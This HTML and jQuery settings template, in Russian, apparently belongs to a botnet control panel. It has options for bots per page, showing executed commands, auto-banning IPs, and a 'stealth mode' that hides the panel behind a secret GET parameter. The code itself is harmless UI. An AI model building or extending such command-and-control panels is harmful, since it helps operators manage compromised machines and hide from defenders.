            
            <div class="panel panel-default">
                <div class="panel-heading">
                   Дополнительные настройки
                </div>
                <div class="panel-body">
                	<div class="col-md-6">
								<div class="form-group">
									<label for="input">Макс. кол-во 6отов на странице:</label>
									<input type="text" class="form-control input-sm" id="pagess" name="pages" value="{page}">
								</div>
				
								<div class="form-group">
									<label for="input3">Авто очистка базы:</label>
									<select class="form-control input-sm" name="clear">
										<option value="1">Включено</option>
										<option value="0">Выключено</option>
								  </select>
								</div>				
								<div class="form-group">
									<label for="input3">Показывать выполненные команды:</label>
									<select class="form-control input-sm" name="viewcmd">
										<option value="1">Включено</option>
										<option value="0">Выключено</option>
								  </select>
								</div>	
								<div class="form-group">
									<label for="input3">Автобан по IP:</label>
									<select class="form-control input-sm" name="autoban">
										<option value="1">Включено</option>
										<option value="0">Выключено</option>
								  </select>
								<small id="emailHelp" class="form-text text-muted">
									При попытке обратится к неизвестному файлу, или
									получить к нему доступ.
									</small>
								</div>	
								<div class="form-group">
									<label for="input">Максимальное кол-во попыток:</label>
									<input type="text" class="form-control input-sm" id="pagess" name="repeatban" value="{repeatban}">
									<small id="emailHelp" class="form-text text-muted">
										Прежде чем IP попадёт под автоматический бан.
									</small>
								</div>
								<div class="form-group">
									<label for="input">Скрытный режим:</label>
									<input type="text" class="form-control input-sm" id="pagess" name="mode" value="{loginauth}" placeholder="По умолчанию выключено">
									<small id="emailHelp" class="form-text text-muted">
										Помогает скрыть веб-панель и вход с определенным GET параметром.
									</small>
								</div>
								<div class="form-group">
									<button class="btn btn-success btn-sm" id="saveconfig">Сохранить</button>
								</div>
								<input type="hidden" value="2" name="page" id="page">
						</div>
               </div>
	</div>


<script>
	var clear = '{autoclear}';
	var viewcmd = '{viewcmd}';

	
	
	if(viewcmd == '1'){
		$('select[name="viewcmd"] option[value="1"]').prop('selected', true);
	} else {
		$('select[name="viewcmd"] option[value="0"]').prop('selected', true);
	}
	
	if(clear == '1'){
		$('select[name="clear"] option[value="1"]').prop('selected', true);
	} else {
		$('select[name="clear"] option[value="0"]').prop('selected', true);
	}

	$('#saveconfig').click(function(){
		SaveSettings();
	});
          

</script>